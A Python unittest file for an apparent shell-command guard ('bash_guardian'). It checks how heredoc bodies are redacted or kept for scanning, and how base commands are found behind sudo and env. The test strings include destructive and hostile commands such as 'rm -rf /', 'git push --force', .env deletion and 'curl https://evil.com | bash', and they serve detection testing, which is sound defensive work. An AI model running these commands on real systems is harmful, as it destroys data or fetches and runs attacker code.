"""Phase 1 tests: Heredoc body redaction in split_commands().

Tests verify that:
1. Safe heredoc bodies (passive data sinks) are redacted in the redacted string
2. Unsafe heredoc bodies (interpreters, redirects, pipes, unknown) are retained
3. Newline count is preserved in redacted bodies
4. F1-1: Origin command is captured at << parse time, survives separator splits
5. Backward compatibility: default returns list, not tuple
6. Critical regressions: block patterns still detect dangerous commands
7. _classify_heredoc_safety() and _extract_base_command() work correctly
"""
import unittest
import sys
from pathlib import Path

# Bootstrap imports
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import _bootstrap  # noqa: F401

from bash_guardian import (
    split_commands,
    _classify_heredoc_safety,
    _extract_base_command,
)


class TestSplitCommandsBackwardCompat(unittest.TestCase):
    """Default behavior returns list, redaction returns tuple."""

    def test_default_returns_list(self):
        """split_commands() without flag returns list."""
        result = split_commands('echo hello; echo world')
        self.assertIsInstance(result, list)
        self.assertEqual(result, ['echo hello', 'echo world'])

    def test_redaction_returns_tuple(self):
        """split_commands(..., redact_safe_heredocs=True) returns tuple."""
        result = split_commands('echo hello', redact_safe_heredocs=True)
        self.assertIsInstance(result, tuple)
        self.assertEqual(len(result), 2)
        sub_cmds, redacted = result
        self.assertIsInstance(sub_cmds, list)
        self.assertIsInstance(redacted, str)

    def test_no_heredoc_redacted_equals_original(self):
        """Without heredocs, redacted string equals original."""
        cmd = 'echo hello; rm -rf /tmp/test'
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertEqual(redacted, cmd)

    def test_empty_command(self):
        """Empty command returns empty list and empty string."""
        sub_cmds, redacted = split_commands('', redact_safe_heredocs=True)
        self.assertEqual(sub_cmds, [])
        self.assertEqual(redacted, '')


class TestSafeHeredocRedaction(unittest.TestCase):
    """Safe heredoc bodies (passive data sinks) are redacted."""

    def test_cat_heredoc_body_redacted(self):
        """cat << EOF: body should be redacted (cat is passive data sink)."""
        cmd = 'cat << EOF\nrm -rf /\nsome data\nEOF\necho done'
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Body content should NOT appear in redacted string
        self.assertNotIn('rm -rf /', redacted)
        self.assertNotIn('some data', redacted)
        # Delimiter and surrounding commands should remain
        self.assertIn('cat << EOF', redacted)
        self.assertIn('EOF', redacted)
        self.assertIn('echo done', redacted)

    def test_grep_heredoc_body_redacted(self):
        """grep << EOF: body should be redacted."""
        cmd = 'grep pattern << EOF\ngit push --force\nEOF'
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('git push --force', redacted)

    def test_cat_heredoc_sub_commands_unchanged(self):
        """Redaction does not affect sub-command list."""
        cmd = 'cat << EOF\nrm -rf /\nEOF\necho done'
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('echo done', sub_cmds)
        # Body line should NOT be in sub_commands (consumed by heredoc)
        self.assertNotIn('rm -rf /', sub_cmds)

    def test_newline_count_preserved(self):
        """Redacted body must have same newline count as original."""
        cmd = 'cat << EOF\nline1\nline2\nline3\nEOF\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        original_newlines = cmd.count('\n')
        redacted_newlines = redacted.count('\n')
        self.assertEqual(original_newlines, redacted_newlines)

    def test_tab_stripped_heredoc_redacted(self):
        """cat <<- EOF: tab-stripped heredoc body should also be redacted."""
        cmd = 'cat <<- EOF\n\trm -rf /\n\tEOF\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)
        self.assertIn('echo done', redacted)

    def test_jq_heredoc_body_redacted(self):
        """jq << EOF: body is data, should be redacted."""
        cmd = 'jq . << EOF\n{"key": "curl | bash"}\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('curl | bash', redacted)

    def test_echo_heredoc_body_redacted(self):
        """echo << EOF: passive data sink, body redacted."""
        cmd = 'echo << EOF\nrm -rf .git\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf .git', redacted)

    def test_env_prefix_cat_redacted(self):
        """env cat << EOF: env prefix stripped, cat is passive → safe."""
        cmd = 'env cat << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_sudo_cat_redacted(self):
        """sudo cat << EOF: sudo stripped, cat is passive → safe."""
        cmd = 'sudo cat << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_absolute_path_cat_redacted(self):
        """/usr/bin/cat << EOF: path stripped, cat is passive → safe."""
        cmd = '/usr/bin/cat << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)


class TestUnsafeHeredocRetention(unittest.TestCase):
    """Unsafe heredoc bodies are retained in redacted string."""

    def test_bash_heredoc_body_retained(self):
        """bash << EOF: interpreter, body must be retained."""
        cmd = 'bash << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_python3_heredoc_body_retained(self):
        """python3 << EOF: interpreter, body must be retained."""
        cmd = 'python3 << EOF\nimport os; os.remove(".env")\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('os.remove', redacted)

    def test_sh_heredoc_body_retained(self):
        """sh << EOF: interpreter, body retained."""
        cmd = 'sh << EOF\nrm -rf .git\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf .git', redacted)

    def test_eval_heredoc_body_retained(self):
        """eval << EOF: interpreter, body retained."""
        cmd = 'eval << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_node_heredoc_body_retained(self):
        """node << EOF: interpreter, body retained."""
        cmd = 'node << EOF\nrequire("child_process").execSync("rm -rf /")\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_redirect_makes_heredoc_unsafe(self):
        """cat > file.sh << EOF: output redirect, body retained (Rule 2)."""
        cmd = 'cat > script.sh << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_append_redirect_makes_heredoc_unsafe(self):
        """cat >> file.sh << EOF: append redirect, body retained."""
        cmd = 'cat >> script.sh << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_pipe_makes_heredoc_unsafe(self):
        """cat << EOF | bash: piped to interpreter, body retained (Rule 3)."""
        cmd = 'cat << EOF | bash\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_pipe_to_passive_still_unsafe(self):
        """cat << EOF | grep: piped, body retained even if target is passive."""
        cmd = 'cat << EOF | grep pattern\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_unknown_command_body_retained(self):
        """mycmd << EOF: unknown command, body retained (Rule 5, fail-closed)."""
        cmd = 'mycmd << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_tee_body_retained(self):
        """tee << EOF: tee writes to files, not a passive sink (F1-2 fix)."""
        cmd = 'tee output.txt << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_sort_body_retained(self):
        """sort << EOF: sort has -o flag, not a passive sink."""
        cmd = 'sort << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_unterminated_heredoc_body_retained(self):
        """Unterminated heredoc: everything consumed, body retained (fail-closed)."""
        cmd = 'cat << EOF\nrm -rf /\nnever ends'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Unterminated → UNSAFE → body retained in redacted string
        self.assertIn('rm -rf /', redacted)


class TestF11OriginTracking(unittest.TestCase):
    """F1-1: Origin command captured at << time, survives separators."""

    def test_bash_semicolon_cat_origin_is_bash(self):
        """bash << EOF ; cat: origin is 'bash', not 'cat'. Body retained."""
        cmd = 'bash << EOF ; cat\nrm -rf /\nEOF\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Origin "bash" → UNSAFE → body retained
        self.assertIn('rm -rf /', redacted)

    def test_cat_semicolon_bash_origin_is_cat(self):
        """cat << EOF ; bash: origin is 'cat'. Body redacted (safe)."""
        cmd = 'cat << EOF ; bash\nrm -rf /\nEOF\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Origin "cat" → SAFE → body redacted
        self.assertNotIn('rm -rf /', redacted)

    def test_cat_and_and_bash_origin_is_cat(self):
        """cat << EOF && bash: origin is 'cat'. Body redacted."""
        cmd = 'cat << EOF && bash\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_pipe_overrides_safe_origin(self):
        """cat << EOF | bash: origin is 'cat' but piped → UNSAFE."""
        cmd = 'cat << EOF | bash\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_multiple_heredocs_different_origins(self):
        """bash << E1 ; cat << E2: first UNSAFE (bash), second SAFE (cat)."""
        cmd = 'bash << E1 ; cat << E2\nbody1\nE1\nbody2\nE2\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # First body (origin "bash") → UNSAFE → retained
        self.assertIn('body1', redacted)
        # Second body (origin "cat") → SAFE → redacted
        self.assertNotIn('body2', redacted)

    def test_background_ampersand_preserves_origin(self):
        """cat << EOF &: background, origin is 'cat'. Body redacted."""
        cmd = 'cat << EOF &\nrm -rf /\nEOF\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)


class TestMultipleHeredocs(unittest.TestCase):
    """Multiple heredocs on same command or same line."""

    def test_two_heredocs_same_command(self):
        """cat << E1 << E2: both bodies classified via same origin (cat)."""
        cmd = 'cat << E1 << E2\nbody1\nE1\nbody2\nE2\necho done'
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Both bodies safe (cat is passive data sink)
        self.assertNotIn('body1', redacted)
        self.assertNotIn('body2', redacted)
        self.assertIn('echo done', redacted)

    def test_two_heredocs_both_safe_newline_preserved(self):
        """Two safe heredocs: newline count preserved."""
        cmd = 'cat << E1 << E2\nline1\nE1\nline2\nline3\nE2\necho done'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertEqual(cmd.count('\n'), redacted.count('\n'))


class TestHereStringUnaffected(unittest.TestCase):
    """Here-strings (<<<) are NOT heredocs and should be unaffected."""

    def test_here_string_not_treated_as_heredoc(self):
        """cat <<< 'data': not a heredoc, redacted string unchanged."""
        cmd = "cat <<< 'rm -rf /'"
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertEqual(redacted, cmd)


class TestExtractBaseCommand(unittest.TestCase):
    """_extract_base_command() extracts the actual command name."""

    def test_simple_command(self):
        self.assertEqual(_extract_base_command('cat'), 'cat')

    def test_with_args(self):
        self.assertEqual(_extract_base_command('cat -n file.txt'), 'cat')

    def test_env_prefix(self):
        self.assertEqual(_extract_base_command('env cat'), 'cat')

    def test_variable_assignment(self):
        self.assertEqual(_extract_base_command('FOO=bar cat'), 'cat')

    def test_sudo(self):
        self.assertEqual(_extract_base_command('sudo cat'), 'cat')

    def test_sudo_with_flags(self):
        self.assertEqual(_extract_base_command('sudo -u root cat'), 'cat')

    def test_absolute_path(self):
        self.assertEqual(_extract_base_command('/usr/bin/cat'), 'cat')

    def test_empty_string(self):
        self.assertEqual(_extract_base_command(''), '')

    def test_only_variable_assignment(self):
        self.assertEqual(_extract_base_command('FOO=bar'), '')

    def test_io_redirect_before_command(self):
        """< /dev/null bash: skip redirect, return 'bash'."""
        self.assertEqual(_extract_base_command('< /dev/null bash'), 'bash')

    def test_multiple_prefixes(self):
        self.assertEqual(_extract_base_command('env FOO=bar sudo -u nobody /usr/bin/cat'), 'cat')

    def test_nohup_prefix(self):
        self.assertEqual(_extract_base_command('nohup cat'), 'cat')

    def test_command_prefix(self):
        self.assertEqual(_extract_base_command('command cat'), 'cat')


class TestClassifyHeredocSafety(unittest.TestCase):
    """_classify_heredoc_safety() classification rules."""

    def test_rule1_interpreter_unsafe(self):
        """Rule 1: interpreter command → UNSAFE."""
        self.assertFalse(_classify_heredoc_safety('bash', False))
        self.assertFalse(_classify_heredoc_safety('python3', False))
        self.assertFalse(_classify_heredoc_safety('node', False))
        self.assertFalse(_classify_heredoc_safety('eval', False))

    def test_rule2_redirect_unsafe(self):
        """Rule 2: output redirect → UNSAFE."""
        self.assertFalse(_classify_heredoc_safety('cat > file.sh', False))
        self.assertFalse(_classify_heredoc_safety('cat >> file.sh', False))

    def test_rule3_piped_unsafe(self):
        """Rule 3: piped → UNSAFE even if passive data sink."""
        self.assertFalse(_classify_heredoc_safety('cat', True))

    def test_rule4_passive_sink_safe(self):
        """Rule 4: passive data sink → SAFE."""
        self.assertTrue(_classify_heredoc_safety('cat', False))
        self.assertTrue(_classify_heredoc_safety('grep', False))
        self.assertTrue(_classify_heredoc_safety('head', False))
        self.assertTrue(_classify_heredoc_safety('jq .', False))

    def test_rule5_unknown_unsafe(self):
        """Rule 5: unknown command → UNSAFE (fail-closed)."""
        self.assertFalse(_classify_heredoc_safety('mycmd', False))
        self.assertFalse(_classify_heredoc_safety('custom_tool', False))

    def test_rule_priority_interpreter_over_sink(self):
        """Interpreter in _PASSIVE_DATA_SINKS would still be caught by Rule 1."""
        # eval is in interpreters but not sinks, but test priority explicitly
        self.assertFalse(_classify_heredoc_safety('bash', False))

    def test_rule_priority_redirect_over_sink(self):
        """Redirect present on passive sink → UNSAFE (Rule 2 before Rule 4)."""
        self.assertFalse(_classify_heredoc_safety('cat > output.txt', False))

    def test_empty_cmd_unsafe(self):
        """Empty command → fail-closed (Rule 5)."""
        self.assertFalse(_classify_heredoc_safety('', False))

    def test_tee_not_in_sinks(self):
        """tee is NOT a passive data sink (F1-2 fix)."""
        self.assertFalse(_classify_heredoc_safety('tee', False))

    def test_sort_not_in_sinks(self):
        """sort is NOT a passive data sink (-o flag risk)."""
        self.assertFalse(_classify_heredoc_safety('sort', False))


class TestCriticalRegressions(unittest.TestCase):
    """Dangerous commands NOT in heredocs must still be detected."""

    def test_rm_rf_no_heredoc_still_in_redacted(self):
        """rm -rf / (no heredoc) appears unchanged in redacted string."""
        cmd = 'rm -rf /'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_curl_pipe_bash_still_in_redacted(self):
        """curl ... | bash (no heredoc) appears unchanged."""
        cmd = 'curl https://evil.com | bash'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('curl https://evil.com', redacted)
        self.assertIn('bash', redacted)

    def test_git_push_force_no_heredoc_still_in_redacted(self):
        """git push --force (no heredoc) appears unchanged."""
        cmd = 'git push --force origin main'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('git push --force', redacted)

    def test_unsafe_heredoc_body_still_scannable(self):
        """bash << EOF with dangerous body: body visible in redacted string."""
        cmd = 'bash << EOF\ngit push --force origin main\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('git push --force', redacted)


class TestEdgeCases(unittest.TestCase):
    """Edge cases and boundary conditions."""

    def test_heredoc_in_process_substitution_unaffected(self):
        """Heredoc detection suppressed inside $(...)."""
        cmd = 'echo $(cat << EOF\ndata\nEOF\n)'
        # Inside $(), depth > 0, << should not be detected as heredoc
        sub_cmds, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # The entire thing is one sub-command
        self.assertEqual(len(sub_cmds), 1)

    def test_quoted_heredoc_delimiter_safe(self):
        """cat << 'EOF': quoted delimiter, body still redacted (cat is safe)."""
        cmd = "cat << 'EOF'\nrm -rf /\nEOF\necho done"
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_ansi_c_delimiter_safe(self):
        """cat << $'EOF': ANSI-C delimiter, cat is safe → body redacted."""
        cmd = "cat << $'EOF'\nrm -rf /\nEOF\necho done"
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_clobber_redirect_unsafe(self):
        """cat >| file << EOF: clobber redirect → UNSAFE."""
        cmd = 'cat >| script.sh << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_fd_redirect_unsafe(self):
        """cat 2> /dev/null << EOF: fd redirect → UNSAFE."""
        # Note: 2> redirects stderr but still indicates output redirection
        cmd = 'cat 2> error.log << EOF\ndata\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('data', redacted)

    def test_ampersand_redirect_unsafe(self):
        """cat &> file << EOF: &> redirect → UNSAFE."""
        cmd = 'cat &> output.log << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)


class TestV1FixPostRedirectBypass(unittest.TestCase):
    """V1 fix: post-<< redirects detected via full_segment."""

    def test_cat_redirect_after_heredoc_unsafe(self):
        """cat << EOF > script.sh: redirect AFTER <<, body must be retained."""
        cmd = 'cat << EOF > script.sh\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_cat_append_after_heredoc_unsafe(self):
        """cat << EOF >> script.sh: append after <<, body retained."""
        cmd = 'cat << EOF >> script.sh\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_cat_redirect_fd_after_heredoc_unsafe(self):
        """cat << EOF 1>out: fd redirect after <<, body retained."""
        cmd = 'cat << EOF 1>out\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_cat_ampersand_redirect_after_heredoc_unsafe(self):
        """cat << EOF &>out: &> redirect after <<, body retained."""
        cmd = 'cat << EOF &>out\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_redirect_before_still_works(self):
        """cat > script.sh << EOF: redirect before << still detected."""
        cmd = 'cat > script.sh << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_no_redirect_still_safe(self):
        """cat << EOF (no redirect): still redacted as safe."""
        cmd = 'cat << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('rm -rf /', redacted)

    def test_redirect_after_separator_preserved(self):
        """cat << EOF > out ; echo: redirect in full segment, body retained."""
        cmd = 'cat << EOF > out ; echo hi\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)


class TestV1FixUnquotedExpansion(unittest.TestCase):
    """V1 fix: unquoted heredoc bodies with expansion syntax → UNSAFE."""

    def test_unquoted_dollar_paren_retained(self):
        """cat << EOF with $(cmd) in body: unquoted + expansion → UNSAFE."""
        cmd = 'cat << EOF\n$(rm -rf /)\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('$(rm -rf /)', redacted)

    def test_unquoted_backtick_retained(self):
        """cat << EOF with backtick in body: unquoted + expansion → UNSAFE."""
        cmd = 'cat << EOF\n`rm -rf /`\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('`rm -rf /`', redacted)

    def test_unquoted_dollar_variable_retained(self):
        """cat << EOF with $VAR in body: unquoted + expansion → UNSAFE."""
        cmd = 'cat << EOF\npath is $HOME/.env\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('$HOME', redacted)

    def test_quoted_delimiter_with_dollar_safe(self):
        """cat << 'EOF' with $(cmd) in body: quoted → no expansion → SAFE."""
        cmd = "cat << 'EOF'\n$(rm -rf /)\nEOF"
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Quoted delimiter suppresses expansion, body is data → safe to redact
        self.assertNotIn('$(rm -rf /)', redacted)

    def test_double_quoted_delimiter_with_dollar_safe(self):
        """cat << "EOF" with $(cmd) in body: double-quoted → no expansion → SAFE.

        Note: in bash, double-quoted delimiters actually DO suppress expansion
        in heredoc bodies (unlike regular double-quoted strings). So this is
        correct: the body is literal data.
        """
        cmd = 'cat << "EOF"\n$(rm -rf /)\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('$(rm -rf /)', redacted)

    def test_unquoted_plain_text_safe(self):
        """cat << EOF with plain text body: unquoted but no $ or ` → SAFE."""
        cmd = 'cat << EOF\nplain text\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('plain text', redacted)

    def test_backslash_escaped_delimiter_safe(self):
        r"""cat << \EOF with $(cmd) in body: backslash quoting → SAFE."""
        cmd = 'cat << \\EOF\n$(rm -rf /)\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # Backslash-escaped delimiter = quoted → no expansion → safe to redact
        self.assertNotIn('$(rm -rf /)', redacted)


class TestV1FixSudoParsing(unittest.TestCase):
    """V1 fix: sudo flag parsing in _extract_base_command()."""

    def test_sudo_H_cat(self):
        """sudo -H cat: -H takes no argument."""
        self.assertEqual(_extract_base_command('sudo -H cat'), 'cat')

    def test_sudo_n_cat(self):
        """sudo -n cat: -n takes no argument."""
        self.assertEqual(_extract_base_command('sudo -n cat'), 'cat')

    def test_sudo_double_dash_cat(self):
        """sudo -- cat: -- terminates flags."""
        self.assertEqual(_extract_base_command('sudo -- cat'), 'cat')

    def test_sudo_u_root_cat(self):
        """sudo -u root cat: -u takes argument 'root'."""
        self.assertEqual(_extract_base_command('sudo -u root cat'), 'cat')

    def test_sudo_combined_flags(self):
        """sudo -H -u root cat: -H no-arg, -u takes arg."""
        self.assertEqual(_extract_base_command('sudo -H -u root cat'), 'cat')


class TestV1FixMissingCoverage(unittest.TestCase):
    """Additional coverage from V1 edge case review."""

    def test_source_heredoc_retained(self):
        """source << EOF: interpreter, body retained."""
        cmd = 'source << EOF\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_or_or_does_not_set_piped(self):
        """cat << EOF || bash: || is NOT a pipe, origin preserved."""
        cmd = 'cat << EOF || bash\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        # || is not a pipe, so heredoc is not piped
        # Origin is "cat" → SAFE, but body has no expansion → SAFE
        self.assertNotIn('rm -rf /', redacted)

    def test_and_and_does_not_set_piped(self):
        """cat << EOF && bash: && is NOT a pipe, body redacted."""
        cmd = 'cat << EOF && bash\nsafe data\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertNotIn('safe data', redacted)


class TestV2FixFdDuplicationBypass(unittest.TestCase):
    """V2 fix: >&3+ treated as output redirect, only >&0/1/2/- exempt."""

    def test_fd3_redirect_unsafe(self):
        """cat << EOF >&3: fd 3 may point to file, body must be retained."""
        cmd = 'cat << EOF >&3\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_fd9_redirect_unsafe(self):
        """cat << EOF >&9: non-standard fd, body retained."""
        cmd = 'cat << EOF >&9\nrm -rf /\nEOF'
        _, redacted = split_commands(cmd, redact_safe_heredocs=True)
        self.assertIn('rm -rf /', redacted)

    def test_fd2_still_exempt(self):
        """cat << EOF 2>&1: standard fd dup, body may be redacted."""
        # >&2 is fd duplication (stderr to stdout), not file output
        # The classifier should NOT flag this as redirect
        self.assertTrue(
            _classify_heredoc_safety('cat', False, 'cat << EOF 2>&1')
        )

    def test_fd_close_still_exempt(self):
        """>&- is fd close, not file output."""
        self.assertTrue(
            _classify_heredoc_safety('cat', False, 'cat << EOF >&-')
        )


class TestV2FixSudoNoargAllowlist(unittest.TestCase):
    """V2 fix: sudo uses no-arg allowlist (fail-closed for unknown flags)."""

    def test_sudo_p_prompt_python(self):
        """sudo -p cat python: -p takes argument 'cat', command is 'python'."""
        self.assertEqual(_extract_base_command('sudo -p cat python'), 'python')

    def test_sudo_c_class_bash(self):
        """sudo -c staff bash: -c takes argument 'staff', command is 'bash'."""
        # Note: -c is "login class" on some sudo versions
        self.assertEqual(_extract_base_command('sudo -c staff bash'), 'bash')

    def test_sudo_unknown_flag_failclosed(self):
        """sudo -Z foo cat: unknown -Z assumed arg-taking → returns 'cat'."""
        self.assertEqual(_extract_base_command('sudo -Z foo cat'), 'cat')

    def test_sudo_noarg_flags_still_work(self):
        """sudo -E -H -n cat: all no-arg flags skipped correctly."""
        self.assertEqual(_extract_base_command('sudo -E -H -n cat'), 'cat')


if __name__ == '__main__':
    unittest.main()
